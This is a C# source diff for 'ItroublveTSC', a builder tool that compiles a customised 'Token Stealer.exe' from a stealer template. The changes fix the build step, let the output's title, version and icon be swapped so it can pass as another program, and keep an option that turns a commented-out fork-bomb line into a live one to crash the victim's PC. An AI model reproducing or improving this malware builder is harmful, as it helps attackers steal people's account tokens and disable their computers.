@@ -9,7 +9,7 @@ using System.Net;
 using System.Threading;
 using System.Windows.Forms;
 using ItroublveTSC2;
-
+using System.Runtime.CompilerServices;
 
 namespace ItroublveTSC
 {
@@ -36,6 +36,7 @@ namespace ItroublveTSC
             {
                 Directory.Delete("bin_copy", true);
             }
+            frmMain.ICON = false;
         }
         #endregion
         #region Create stealer files
@@ -64,7 +65,7 @@ namespace ItroublveTSC
                     string text = File.ReadAllText("TokenStealerCOPY.bin");
                     if (CrashPCchkbox.Checked)
                     {
-                        text = text.Replace("rem %0|%0", "%0|%0");
+                        text = text.Replace("rem %0 | %0", "%0 | %0");
                     }
                     if (RestartPCchkbox.Checked)
                     {
@@ -125,6 +126,7 @@ namespace ItroublveTSC
                 base.Location = Mouse.newpoint;
             }
         }
+        public static bool ICON { get; private set; }
         #endregion
         #region Compile changes to EXE
         private void roundBtn1_Click(object sender, EventArgs e)
@@ -151,17 +153,11 @@ namespace ItroublveTSC
                     string path = @"bin_copy";
                     if (!Directory.Exists(path))
                     {
-						new Process
-						{
-							StartInfo = new ProcessStartInfo
-							{
-								WindowStyle = ProcessWindowStyle.Hidden,
-								FileName = Path.Combine(Environment.SystemDirectory, "xcopy.exe"),
-								Arguments = "bin bin_copy /E /I"
-							}
-						}.Start();
-						Thread.Sleep(3000); 
+                        string test = @"bin";
+                        string test2 = @"bin_copy";
+                        Copy(test, test2);
 					}
+                    string text3 = File.ReadAllText(@"bin_copy/TOKEN STEALER CREATOR.csproj");
                     string text = File.ReadAllText(@"bin_copy/Program.cs");
                     string text2 = File.ReadAllText(@"bin_copy/Properties/AssemblyInfo.cs");
                     text = text.Replace("finalresbatch", this.FinalresbatTxt.Text);
@@ -169,10 +165,13 @@ namespace ItroublveTSC
                     if (flag2)
                     {
                         text2 = text2.Replace("titel", "");
+                        text3 = text3.Replace("TOKEN STEALER CREATOR", "I don't know my name!");
                     }
                     else
                     {
                         text2 = text2.Replace("titel", AssemblyTitleTxt.Text);
+                        text3 = text3.Replace("TOKEN_STEALER_CREATOR", AssemblyTitleTxt.Text);
+                        text3 = text3.Replace("TOKEN STEALER CREATOR", AssemblyTitleTxt.Text);
                     }
                     if (flag3)
                     {
@@ -198,11 +197,7 @@ namespace ItroublveTSC
                     {
                         text2 = text2.Replace("rightcopy", AssemblyCopyrTxt.Text);
                     }
-                    if (flag6)
-                    {
-                        text2 = text2.Replace("1.0.0.0", "1.0.0.0");
-                    }
-                    else
+                    if (!flag6)
                     {
                         text2 = text2.Replace("1.0.0.0", AssemblyFileVTxt.Text);
                     }
@@ -218,6 +213,7 @@ namespace ItroublveTSC
                     }
                     File.WriteAllText(@"bin_copy/Program.cs", text);
                     File.WriteAllText(@"bin_copy/Properties/AssemblyInfo.cs", text2);
+                    File.WriteAllText(@"bin_copy/TOKEN STEALER CREATOR.csproj", text3);
 
                     Process.Start(new ProcessStartInfo()
                     {
@@ -226,7 +222,7 @@ namespace ItroublveTSC
                         CreateNoWindow = true,
                         FileName = "cmd.exe"
                     });
-                    Thread.Sleep(10000);
+                    Thread.Sleep(7000);
                 }
                 catch
                 {
@@ -250,19 +246,44 @@ namespace ItroublveTSC
                 }
                 try
                 {
-                    string path = @"bin_copy\bin\debug\TOKEN STEALER CREATOR.exe";
                     string path2 = "Token Stealer.exe";
                     string folderPath = "bin_copy";
-                    if (!File.Exists(path))
-                    {
-                        MessageBox.Show("Failed to create Token Stealer, please try again or .NET framework is missing!", "ItroublveTSC");
-                        Environment.Exit(0);
-                    }
                     if (File.Exists(path2))
+                    {
                         File.Delete(path2);
-                    File.Move(path, path2);
+                    }
+                    Process.Start(new ProcessStartInfo()
+                    {
+                        Arguments = "/C move \".\\bin_copy\\bin\\Debug\\*.exe\" \"Token Stealer.exe\"",
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        CreateNoWindow = true,
+                        FileName = "cmd.exe",
+                    });
+                    Thread.Sleep(3000);
                     Directory.Delete(folderPath, true);
-                    MessageBox.Show("Token Stealer.exe successfully compiled!", "ItroublveTSC");
+                    if (File.Exists(path2))
+                    {
+                        MessageBox.Show("Token Stealer.exe successfully compiled!", "ItroublveTSC");
+                    }
+                    else
+                    {
+                        if (frmMain.ICON)
+                        {
+                            if (MessageBox.Show("The ICO wasn't converted correctly.\r\n" +
+                                "Do you want to convert right now, again?", "ItroublveTSC", MessageBoxButtons.YesNo) == DialogResult.Yes)
+                            {
+                                Process.Start("https://convertico.com/");
+                            }
+                        }
+                        else
+                        {
+                            if (MessageBox.Show("Failed to create stealer;" +
+                                "\r\nMake sure you have .NET framework and try again.\r\nWant to get in touch?", "ItroublveTSC", MessageBoxButtons.YesNoCancel) == DialogResult.Yes)
+                            {
+                                Process.Start("https://itroublvehacker.ml/howtousev5");
+                            }
+                        }
+                    }
                 }
                 catch (Exception ex)
                 {
@@ -302,16 +323,9 @@ namespace ItroublveTSC
         {
             if (!File.Exists("bin_copy/Program.cs"))
             {
-                new Process
-                {
-                    StartInfo = new ProcessStartInfo
-                    {
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        FileName = Path.Combine(Environment.SystemDirectory, "xcopy.exe"),
-                        Arguments = "bin bin_copy /E /I"
-                    }
-                }.Start();
-                Thread.Sleep(3000);
+                string test = @"bin";
+                string test2 = @"bin_copy";
+                Copy(test, test2);
             }
             var fileContent = string.Empty;
             var filePath = string.Empty;
@@ -342,6 +356,7 @@ namespace ItroublveTSC
                         text = text.Replace("YourICON", filePath);
                         File.WriteAllText(@"bin_copy/TOKEN STEALER CREATOR.csproj", text);
                         IconPrePic.Image = new Bitmap(filePath);
+                        frmMain.ICON = true;
                     }
                     catch (Exception ex)
                     {
@@ -492,5 +507,34 @@ namespace ItroublveTSC
             }
         }
         #endregion
+        #region COPY
+        public static void Copy(string sourceDirectory, string targetDirectory)
+        {
+            var diSource = new DirectoryInfo(sourceDirectory);
+            var diTarget = new DirectoryInfo(targetDirectory);
+
+            CopyAll(diSource, diTarget);
+        }
+
+        public static void CopyAll(DirectoryInfo source, DirectoryInfo target)
+        {
+            Directory.CreateDirectory(target.FullName);
+
+            // Copy each file into the new directory.
+            foreach (FileInfo fi in source.GetFiles())
+            {
+                Console.WriteLine(@"Copying {0}\{1}", target.FullName, fi.Name);
+                fi.CopyTo(Path.Combine(target.FullName, fi.Name), true);
+            }
+
+            // Copy each subdirectory using recursion.
+            foreach (DirectoryInfo diSourceSubDir in source.GetDirectories())
+            {
+                DirectoryInfo nextTargetSubDir =
+                    target.CreateSubdirectory(diSourceSubDir.Name);
+                CopyAll(diSourceSubDir, nextTargetSubDir);
+            }
+        }
+        #endregion copy 
     }
 }
